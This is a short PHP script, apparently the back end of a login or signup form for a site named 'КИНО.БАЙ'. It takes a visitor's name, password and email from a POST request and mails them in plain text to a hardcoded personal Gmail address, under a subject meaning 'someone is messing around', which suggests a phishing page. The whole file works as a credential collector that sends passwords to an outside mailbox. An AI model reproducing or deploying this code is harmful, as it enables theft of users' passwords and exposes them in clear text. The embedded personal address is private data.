<?php

$recepient = "igor.sobolevsky4@gmail.com";
$sitename = "КИНО.БАЙ";

$name = trim($_POST["name"]);
$password = trim($_POST["password"]);
$email = trim($_POST["email"]);
$message = "Имя: $name \nПароль: $password \nEmail: $email";

$pagetitle = "Кто то балуется \"$sitename\"";
mail($recepient, $pagetitle, $message, "Content-type: text/plain; charset=\"utf-8\"\n From: $recepient");
